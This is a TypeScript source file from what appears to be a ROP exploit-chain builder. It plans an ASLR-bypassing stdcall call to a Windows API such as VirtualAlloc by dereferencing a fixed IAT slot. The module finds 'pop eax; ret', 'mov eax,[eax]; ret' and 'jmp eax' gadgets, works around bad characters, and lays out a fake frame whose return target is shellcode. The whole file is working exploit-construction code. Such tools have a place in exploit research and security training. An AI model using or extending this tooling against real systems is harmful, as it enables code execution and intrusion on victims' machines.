import { CapabilityIndex } from "./capabilities";
import { firstKnownAddress, getStableAddressHint, isAddressStable, retImmBytes, setStableAddressHint } from "./chain";
import { RopGadget } from "./types";
import { FrameWord, WriteFramePlan, planWriteFrame } from "./frame_write";

// ASLR-proof API dispatch through a non-ASLR IAT slot.
//
// When the imported API (e.g. kernel32!VirtualAlloc) is ASLR'd but the module's
// IAT slot that points at it is at a fixed address, we never place the API
// address in the payload. Instead we place a tiny deref preamble as *data* in
// the frame and let it run at pivot time:
//
//   pop eax ; ret          ; eax = <IAT slot>            (stable module)
//   mov eax, [eax] ; ret   ; eax = *slot = live API addr
//   jmp eax                ; dispatch; the fake stdcall frame sits below ESP
//     <retaddr>            ; where the API returns (-> shellcode / jmp esp)
//     <arg1> .. <argN>     ; the stdcall arguments
//
// The three preamble gadget addresses and the slot are badchar-free words; any
// null/badchar-heavy args are synthesised in a register and stored. This is just
// an assembler on top of planWriteFrame: it prepends the preamble words and
// hands the whole word list to the write-frame engine.

export interface SlotDispatchPlan extends WriteFramePlan {
  dispatch: {
    popEax?: bigint;
    deref?: bigint;
    jmpEax?: bigint;
    slot: number;
    unstable: string[]; // preamble gadgets that are NOT at a stable address
  };
}

function op(g: RopGadget, i: number, n: number): string {
  return (g.instructions[i]?.operands[n] ?? "").trim().toLowerCase();
}

function lastIsRet(g: RopGadget): boolean {
  return g.instructions[g.instructions.length - 1]?.mnemonic === "ret";
}

// Stable module first, then fewest instructions, then lowest ret imm, then score.
// (No ret-imm filter here: `jmp eax` has no `ret`; the ret-based finders enforce
// `lastIsRet` themselves.)
function pickBest(cands: RopGadget[]): RopGadget | undefined {
  return [...cands]
    .filter((g) => firstKnownAddress(g) !== undefined)
    .sort((a, b) => {
      const sa = isAddressStable(firstKnownAddress(a)!) ? 0 : 1;
      const sb = isAddressStable(firstKnownAddress(b)!) ? 0 : 1;
      if (sa !== sb) return sa - sb;
      if (a.instructions.length !== b.instructions.length) return a.instructions.length - b.instructions.length;
      if (retImmBytes(a) !== retImmBytes(b)) return retImmBytes(a) - retImmBytes(b);
      return b.score - a.score;
    })[0];
}

// pop eax ; ret
function findPopEax(index: CapabilityIndex): RopGadget | undefined {
  return pickBest(index.gadgets.filter((g) =>
    g.instructions.length === 2 && g.instructions[0].mnemonic === "pop" && op(g, 0, 0) === "eax" && lastIsRet(g)));
}

// mov eax, [eax] ; ret  (self-dereference: eax = *eax)
function findDerefEax(index: CapabilityIndex): RopGadget | undefined {
  return pickBest(index.gadgets.filter((g) =>
    g.instructions.length === 2 && g.instructions[0].mnemonic === "mov" && lastIsRet(g) &&
    op(g, 0, 0) === "eax" && /\[eax\]$/.test(op(g, 0, 1))));
}

// jmp eax  (dispatch to the derefed address without pushing a return)
function findJmpEax(index: CapabilityIndex): RopGadget | undefined {
  return pickBest(index.gadgets.filter((g) =>
    g.instructions[0]?.mnemonic === "jmp" && op(g, 0, 0) === "eax"));
}

const FAIL = (unsatisfied: string[]): SlotDispatchPlan => ({
  steps: [],
  unsatisfied,
  gadgets: {},
  placeholders: [],
  stackBytes: 0,
  success: false,
  dispatch: { slot: 0, unstable: [] },
});

/**
 * Plan an ASLR-proof stdcall call through an IAT slot.
 *
 * @param bufAddress writable staging buffer (value or placeholder).
 * @param slot       the non-ASLR IAT slot holding the (ASLR'd) API pointer.
 * @param frame      the fake stdcall frame: index 0 = the API's return target
 *                   (must be executable), index 1.. = the stdcall arguments.
 */
export function planSlotDispatch(
  index: CapabilityIndex,
  bufAddress: { value?: number; placeholder?: string },
  slot: number,
  frame: FrameWord[],
  badchars: number[] = [],
  preferStable?: (address: bigint) => boolean,
): SlotDispatchPlan {
  const prevHint = getStableAddressHint();
  setStableAddressHint(preferStable ?? prevHint);
  try {
    return planSlotDispatchInner(index, bufAddress, slot, frame, badchars, preferStable);
  } finally {
    setStableAddressHint(prevHint);
  }
}

function planSlotDispatchInner(
  index: CapabilityIndex,
  bufAddress: { value?: number; placeholder?: string },
  slot: number,
  frame: FrameWord[],
  badchars: number[],
  preferStable?: (address: bigint) => boolean,
): SlotDispatchPlan {
  const popEax = findPopEax(index);
  const deref = findDerefEax(index);
  const jmpEax = findJmpEax(index);

  const missing: string[] = [];
  if (!popEax) missing.push("no `pop eax ; ret` to load the IAT slot pointer");
  if (!deref) missing.push("no `mov eax, [eax] ; ret` to dereference the IAT slot");
  if (!jmpEax) missing.push("no `jmp eax` to dispatch the dereferenced pointer");
  if (frame.length === 0) missing.push("no frame words (need at least a return target)");
  if (missing.length > 0) return FAIL(missing);

  const popEaxAddr = firstKnownAddress(popEax!)!;
  const derefAddr = firstKnownAddress(deref!)!;
  const jmpEaxAddr = firstKnownAddress(jmpEax!)!;

  // The preamble gadget addresses ride in the payload as data, so they must be at
  // stable (non-relocating) addresses. Use isAddressStable, which honours the hint
  // set above (from preferStable); with no predicate, everything reads as stable.
  const unstable: string[] = [];
  if (!isAddressStable(popEaxAddr)) unstable.push(`pop eax @ ${hex(Number(popEaxAddr))}`);
  if (!isAddressStable(derefAddr)) unstable.push(`mov eax,[eax] @ ${hex(Number(derefAddr))}`);
  if (!isAddressStable(jmpEaxAddr)) unstable.push(`jmp eax @ ${hex(Number(jmpEaxAddr))}`);

  // The preamble runs as data words at the head of the frame, then the caller's
  // fake stdcall frame follows (return target, then args).
  const words: FrameWord[] = [
    { value: Number(popEaxAddr) >>> 0, comment: "pop eax ; ret (deref preamble)" },
    { value: slot >>> 0, comment: `IAT slot ${hex(slot)}` },
    { value: Number(derefAddr) >>> 0, comment: "mov eax,[eax] ; ret (deref -> live API)" },
    { value: Number(jmpEaxAddr) >>> 0, comment: "jmp eax (dispatch)" },
    ...frame,
  ];

  const plan = planWriteFrame(index, bufAddress, words, badchars, preferStable);
  return {
    ...plan,
    dispatch: {
      popEax: popEaxAddr,
      deref: derefAddr,
      jmpEax: jmpEaxAddr,
      slot: slot >>> 0,
      unstable,
    },
  };
}

function hex(value: number): string {
  return `0x${(value >>> 0).toString(16).toUpperCase().padStart(8, "0")}`;
}
